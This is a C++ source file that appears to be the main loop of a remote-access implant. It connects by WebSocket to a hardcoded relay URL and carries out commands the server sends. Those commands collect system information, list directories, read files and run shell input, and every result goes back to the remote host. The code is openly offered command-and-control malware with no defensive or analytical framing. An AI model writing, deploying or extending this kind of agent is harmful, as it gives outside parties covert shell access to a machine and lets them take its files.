#include "commands.h"
#include "runtime.h"
#include "websocket_client.h"
#include "shell.h"

INT32 start()
{
    auto url = "https://relay.nostdlib.workers.dev/agent"_embed;

    Context context;

    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
    commandHandlers[CommandType::Command_GetSystemInfo] = EMBED_FUNC(Handle_GetSystemInfoCommand);
    commandHandlers[CommandType::Command_GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
    commandHandlers[CommandType::Command_GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
    commandHandlers[CommandType::Command_GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);
    commandHandlers[CommandType::Command_WriteShell] = EMBED_FUNC(Handle_WriteShellCommand);
    commandHandlers[CommandType::Command_ReadShell] = EMBED_FUNC(Handle_ReadShellCommand);

    while (1)
    {
        LOG_INFO("Creating WebSocket client for URL: %s", (PCCHAR)url);

        auto createResult = WebSocketClient::Create(url);
        if (!createResult)
        {
            LOG_ERROR("Failed to open WebSocket connection to %s", (PCCHAR)url);
            return 0;
        }
        WebSocketClient &wsClient = createResult.Value();
        LOG_INFO("WebSocket connection opened successfully to %s", (PCCHAR)url);

        while (1)
        {
            auto readResult = wsClient.Read();
            if (!readResult.IsOk())
            {
                LOG_ERROR("Failed to read message from WebSocket server");
                break;
            }

            PCHAR command = (PCHAR)(readResult.Value().Data);
            UINT8 commandType = command[0];
            command++;
            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
            LOG_INFO("Received message (opcode: %d, length: %d)", (INT32)readResult.Value().Opcode, (INT32)commandLength);

            PCHAR response = nullptr;
            USIZE responseLength = sizeof(UINT32);

            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
            {
                commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
            }
            else
            {
                LOG_ERROR("Unknown command type received: %d", (INT32)commandType);
                response = new CHAR[responseLength];
                *(PUINT32)response = StatusCode::StatusUnknownCommand;
            }

            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
            delete[] response;

            if (!writeResult)
            {
                LOG_ERROR("Failed to send response to WebSocket server");
                break;
            }
            LOG_INFO("Response sent successfully to WebSocket server (length: %u)", (UINT32)responseLength);
        }
    }
    return 1;
}
